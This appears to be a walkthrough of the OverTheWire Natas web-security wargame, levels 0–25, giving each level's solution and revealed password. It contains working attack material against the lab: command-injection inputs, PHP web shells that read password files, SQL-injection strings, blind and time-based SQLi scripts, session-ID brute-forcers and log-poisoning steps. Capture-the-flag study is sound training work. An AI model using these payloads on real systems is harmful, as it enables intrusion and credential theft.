# Level 0 -> 1
- f12
- Inspector

![](../assets/natas0_1.png)
<details><summary>Password</summary>0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq</details>

# Level 1 -> 2
- f12
- Inspector

![](../assets/natas1_2.png)
<details><summary>Password</summary>TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI</details>

# Level 2 -> 3
- f12
- Inspector -> Image **files/pixel.png** -> subfolder **files** exist
- Navigate to **files** folder -> open **user.txt**
<details><summary>Password</summary>3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH</details>

# Level 3 -> 4
- Check **robots.txt** -> Disallow: **/s3cr3t/**
- Navigate to /s3cr3t/ -> open **user.txt**
<details><summary>Password</summary>QryZXc2e0zahULdHrtHxzyYkj59kUxLQ</details>

# Level 4 -> 5
- f12
- Network -> mark first request where File = **index.php**
![](../assets/natas4_5.png)
- **Firefox**: right click -> copy value -> Copy as Powershell (my case)
``` Powershell
# Changed Referer from natas4 to natas5
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
Invoke-WebRequest -UseBasicParsing -Uri "http://natas4.natas.labs.overthewire.org/index.php" `
-WebSession $session `
-UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0" `
-Headers @{
"Accept" = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  "Accept-Language" = "en-US,en;q=0.5"
  "Accept-Encoding" = "gzip, deflate"
  "Authorization" = "Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR"
  "Referer" = "http://natas5.natas.labs.overthewire.org/"
} | Select-Object -Expand Content
```
- Save script and execute
<details><summary>Password</summary>0n35PkggAPm2zbEpOU802c0x0Msn1ToK</details>

# Level 5 -> 6
- f12
- Network -> mark first request where File = **index.php**
- See Response Headers -> See **Set-Cookie: loggedin=0**
- Storage -> Cookies -> set Value for Cookie **loggedin** to **1**
- Reload Page
<details><summary>Password</summary>0RoJwHdSKWFTYR5WuiAewauSuNaBXned</details>

# Level 6 -> 7
- View sourcecode -> see **include "includes/secret.inc";**
- Navigate to file -> copy secret -> submit secret
<details><summary>Password</summary>bmg8SvU1LizuWjx3y7xkNERkHxGre0GS</details>

# Level 7 -> 8
- f12
- Inspector -> see comment password is in **/etc/natas_webpass/natas8**
- Change URL Query to **http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8**
- Enter
<details><summary>Password</summary>xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q</details>

# Level 8 -> 9
- View sourcecode
``` php
<?      
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
	return bin2hex(strrev(base64_encode($secret)));  
}
if(array_key_exists("submit", $_POST)) {
	if(encodeSecret($_POST['secret']) == $encodedSecret) {
		print "Access granted. The password for natas9 is <censored>";
	} else {
		print "Wrong secret";       
	}   
}   
?>
```
- go to https://onlinephp.io and execute following code to decode secret
``` php
<?php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
function decodeSecret($secret) {
	return base64_decode(strrev(hex2bin($secret)));
}
print decodeSecret($encodedSecret);
```
- submit secret
<details><summary>Password</summary>ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t</details>

# Level 9 -> 10
- View sourcecode
``` php
`<?   
$key = "";      
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];   
}      
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>`
```
- we can submit following
```
"" /etc/natas_webpass/natas10 #
```
<details><summary>Password</summary>t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu</details>

# Level 10 -> 11
- View sourcecode
``` php
<?
$key = "";
if(array_key_exists("needle", $_REQUEST))
{
	$key = $_REQUEST["needle"];   
}
if($key != "") 
{
	if(preg_match('/[;|&]/',$key)) 
	{           
		print "Input contains an illegal character!";       
	} else {        
		passthru("grep -i $key dictionary.txt");       
	}   
}
?>
```
- we can submit following
```
"" /etc/natas_webpass/natas11 #
```
<details><summary>Password</summary>UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk</details>

# Level 11 -> 12
- View sourcecode
``` php
`<?      
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");      

function xor_encrypt($in) {    
	$key = '<censored>';    
	$text = $in;    
	$outText = '';    
	// Iterate through each character
	for($i=0;$i<strlen($text);$i++) {    
		$outText .= $text[$i] ^ $key[$i % strlen($key)];       
	}          
	return $outText;   
}      
function loadData($def) {       
	global $_COOKIE;    
	$mydata = $def;   
	if(array_key_exists("data", $_COOKIE)) {   
		$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
			if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {           
			if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {        
				$mydata['showpassword'] = $tempdata['showpassword'];        
				$mydata['bgcolor'] = $tempdata['bgcolor'];           
			}       
		}       
	}       
	return $mydata;   
}      
function saveData($d) {    
	setcookie("data", base64_encode(xor_encrypt(json_encode($d))));   
}      
$data = loadData($defaultdata);      
if(array_key_exists("bgcolor",$_REQUEST)) {      
	if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {        
		$data['bgcolor'] = $_REQUEST['bgcolor'];      
	}   
}      
saveData($data);            
?>
      
<h1>natas11</h1>   
<div id="content">   
<body style="background: <?=$data['bgcolor']?>;">   Cookies are protected with XOR encryption<br/><br/>      

<?   
if($data["showpassword"] == "yes") {       print "The password for natas12 is <censored><br>";   
}      
?>
```
We can see
- **$defaultdata** contains value if password should be visible or not
- **$defaultdata** gets json encoded -> XOR encrypted with a censored key -> base64 encoded

What we need to do
- calculate the censored XOR encryption key

XOR encryption is easy to reverse:
- Example:
	- Num1 XOR Num2 = Num3
	- Num3 XOR Num1 = Num2
	- Num3 XOR Num2 = Num1

In this case it would be the following
- ``$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");`` as our Num1
- ``$key`` as our Num2
- XOR encrypted and base64 encoded Cookie ``HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D`` as Num3

What we know
- Num1 and Num3

What we need to know
- Num2

So now we just modify the xor_encrypt function slightly to following
``` php
function xor_decrypt() {
	$key = "";
	$encrypted = base64_decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=");
	$default   = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
	
	print $encrypted;
	print $default;
	
	for( $i=0; $i<strlen($encrypted); $i++) {
		$key .= $encrypted[$i] ^ $default[$i % strlen($default)];
	}
	print $key;
```
By executing the following function we get the key
``` php
$key = "eDWo"
```
Now just execute the original xor_encrypt function with the **key** set to **"eDWo"** and the **showpassword** value set to **yes** and we get the **cookie**
```
HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
```
Now we set the data cookie to the value and reload the page
<details><summary>Password</summary>yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB</details>

# Level 12 -> 13
- f12
- Inspector -> change **jpg** to **php**

![](../assets/natas12_13.png)
- create a file with following payload (or something similar)
``` php
<?php
print shell_exec("cat /etc/natas_webpass/natas13");
?>
```
- upload and execute
<details><summary>Password</summary>trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC</details>

# Level 13 -> 14
- Same as in Level 11 -> 12 but now we need to change the file signature to "jpg"
- prepend following data to your file **FF D8 FF EE**
	- either
	```shell
	echo -n -e "\xFF\xD8\xFF\xEE" > cmd.jpg && echo -e "<?php \n\
	print shell_exec(\"cat /etc/natas_webpass/natas13\"); \n\      
	?>" >> cmd.jpg
	```
	- or open your HexEditor (HxD in my case) and edit the file
- Upload and execute
<details><summary>Password</summary>z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ</details>

# Level 14 -> 15
- Add ``" OR 1 = 1 -- -`` for either Username or Password (both work)
``` sql
SELECT * from users where username="" OR 1 = 1 -- -" and password=""
-- or
SELECT * from users where username="" and password="" OR 1 = 1 -- -"
```
<details><summary>Password</summary>SdqIqBsFcz3yotlNYErZSZwblkm0lrvx</details>

# Level 15 -> 16
Blind SQL
```python
#!/usr/bin/env python3

import requests
from string import digits, ascii_letters

CHARS = ascii_letters + digits
ADDR = "http://natas15.natas.labs.overthewire.org/index.php"
CREDS = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx") 

def output(passw, currentChar, end):
	print(f"{len(passw)} out of X chars found: {passw + currentChar}", end=end)

s = requests.session()
s.auth = CREDS
password = ""

while True:
	pass_copy = password
	for char in CHARS:	
		output(password, char, "\r")
		
		payload = {"username" : f"natas16\" AND password like binary \"{password + char}%\" # --"}
		resp = s.post(ADDR, data=payload)

		if "This user exists." in resp.text:
			password += char
			break
		
	if password == pass_copy:
		output(password, "", "")
		break
```
<details><summary>Password</summary>hPkjKYviLQctEW33QmuXL6eDVfMW4sGo</details>

# Level 16 -> 17
Is this code beautiful? Absolutely not.
Does it work? YES
```python
#!/usr/bin/env python3

import requests
from string import digits, ascii_letters

CHARS = ascii_letters + digits
ADDR = "http://natas16.natas.labs.overthewire.org/index.php"
CREDS = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
QUERY = "?submit=Search&needle="

def output(passw, currentChar, message ,end):

	print(f"{message} {len(passw)} out of X chars found: {passw + currentChar}", end=end)

s = requests.session()
s.auth = CREDS

charsInPassword = ""

for char in CHARS:

	output(charsInPassword, char, "Characters in password","\r")

	payload = f"$(grep {char} /etc/natas_webpass/natas17)snake"
	fullquery = QUERY + payload

	resp = s.get(ADDR + fullquery)

	if not "snake" in resp.text:
		charsInPassword += char

print("\n\n")

password = ""
prefix = False

while True:
	pass_copy = password

	for char in charsInPassword:
		tmp_pass = ""

		if prefix:
			tmp_pass = char + password
		else:
			tmp_pass = password + char
		
		payload = f"$(grep {tmp_pass} /etc/natas_webpass/natas17)snake"
		fullquery = QUERY + payload
		
		resp = s.get(ADDR + fullquery)
		
		if not "snake" in resp.text:
			password = tmp_pass
			prefix = False
			
		output(tmp_pass, "", "Final password", "\r")

	if password == pass_copy:
		if prefix:
			output(password, "", "Final Password", "")
			break
		else:
			prefix = True
```
<details><summary>Password</summary>EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC</details>

# Level 17 -> 18
 Blind Time Based SQLi
 ```python
 #!/usr/bin/env python3

import requests
import time
from string import digits, ascii_letters

CHARS = ascii_letters + digits
ADDR = "http://natas17.natas.labs.overthewire.org/index.php"
CREDS = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
QUERY = "natas18 and IF(password like binary \"n%\", sleep(5), \"\") # -- "

def output(passw, currentChar, end):
	print(f"{len(passw)} out of X chars found: {passw + currentChar}", end=end)


s = requests.session()
s.auth = CREDS

password = ""
while True:
	pass_copy = password
	for char in CHARS:
		output(password, char, "\r")
		
		payload = {"username" : f"natas18\" and IF(password like binary \"{password + char}%\", sleep(3), \"\") # --"}
		
		pre_time = time.time()
		resp = s.post(ADDR, data=payload)
		time_diff = time.time() - pre_time
		print(password + char + " : " + str(time_diff), end="\r")
		
		if time_diff >= 2:
			password += char
			break

	if password == pass_copy:
		output(password, "", "")
		break
 ```
 You might need to adjust the seconds you let mysql sleep
<details><summary>Password</summary>6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ</details>

# Level 18 -> 19
```python
#!/usr/bin/env python3

import requests

ADDR = "http://natas18.natas.labs.overthewire.org/index.php"
CREDS = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")
POST_DATA = {"username" : "admin", "password" : "admin"}
COOKIE = {"PHPSESSID": "0"}

def output(id, end):
	print(f"PHPSESSID: {id}", end=end)

s = requests.session()
s.auth = CREDS

for id in range(0,651):
	output(id, "\r")

	COOKIE["PHPSESSID"] = str(id)

	resp = s.get(ADDR, cookies=COOKIE)
		
	if "You are an admin." in resp.text:
		output(id, "\n")
		break
```
<details><summary>Password</summary>tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</details>

# Level 19 -> 20
```python
#!/usr/bin/env python3

import requests
from itertools import product

ADDR = "http://natas19.natas.labs.overthewire.org/index.php"
CREDS = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")

# hex for ASCII '0'–'9'
hexdigits = ["30", "31", "32", "33", "34", "35", "36", "37", "38", "39"]
admin_hex = "admin".encode().hex()
suffix = "2d" + admin_hex # "-admin" in hex

s = requests.Session()
s.auth = CREDS
s.timeout = 5

for a, b, c in product(hexdigits, repeat=3):
	phpsessid = a + b + c + suffix
	
	resp = s.get(ADDR, cookies={"PHPSESSID": phpsessid})

	if "You are an admin." in resp.text:	
		print(f"PHPSESSID: {phpsessid}", end="\n")
		break
	else:
		print(f"PHPSESSID: {phpsessid}", end="\r", flush=True)
```
<details><summary>Password</summary>p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</details>

# Level 20 -> 21
- f12 -> Network
- Input a name and press **Change name**
- Copy the request as cURL or Powershell, whatever you are using
- Edit the data in the body to `name=%0Aadmin 1`
	- %0A is hex for **\n**  (see https://www.ascii-code.com/)
	- by that it writes two lines in the $\_SESSION array
		`name`
		`admin 1`
	- when checking if `$\_SESSION["admin"] == 1` it evaluates to true
	- we need to execute the code two times so that it will work
<details><summary>Password</summary>BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</details>

# Level 21 -> 22
- natas21-experimenter
	- f12 -> network
	- Click **update** and copy request as cURL
	- Edit the data in the body by appending it with `&admin=1` so it will look like this
		```
		align=10px&fontsize=100%25&bgcolor=yellow&submit=Update&admin=1
		```
	- Send the request, by that the $\_SESSION admin = 1 will be created
	- Now edit the same request but change the URL to **natas21** instead of **natas21-experimental** and send it again and there you have your flag
<details><summary>Password</summary>d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz</details>

# Level 22 -> 23
- f12
- copy the request as cURL
- add `?revelio` to the URL and send the request
- cURL does not follow redirects by default, so the redirect gets ignored and we get the flag
<details><summary>Password</summary>dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</details>

# Level 23 -> 24
there are two comparisons that are being made
- does passwd contain "iloveyou" and is passwd > 10
	- for the first one we just insert iloveyou
	- for the second one we add to the front or back a number bigger than 10
- so passwd > 10 does NOT compare the length of the string, but parses any number until the first non numeric value and compares it to 10
`iloveyou11` and we got the flag
<details><summary>Password</summary>MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</details>

# Level 24 -> 25
- strcmp() is used to compare our input to the password to give us access to the credentials
- strcmp() is comparing a string to a string, BUT if we can manage to submit an array instead of a string the function will return NULL which will evaluate to 0 and with the negation ! evaluate to true.
- Following as the query is enough to trigger this, because the `[]` turns the variable into an array
```
?passwd[]=
```
<details><summary>Password</summary>ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</details>

# Level 25 -> 26
- `../` will get replaced with an empty string
- just use `....//` so it will change to `../`
- we cant get around the check if our string contains `natas_webpass`
- The function `logRequest()` logs our User-Agent and stores it in a file called `natas25_OURSESSIONID.log`
- We can store php code in our User-Agent, trigger the logRequest and then reading the log file to execute the php code
- Add following as the User-Agent
```php
<?php echo shell_exec("cat /etc/natas_webpass/natas26") ?>
```
- now send the request with the following query
```
?lang=natas_webpass
```
- after that copy your session id and send following request
```
?lang=....//logs/natas25_YOURSESSIONID.log
```
- and we have the password for natas26, because the php code in the User-Agent got stored in this file and got executed when we accessed it
<details><summary>Password</summary>cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE</details>

# Level 26 -> 27
Too be continued ->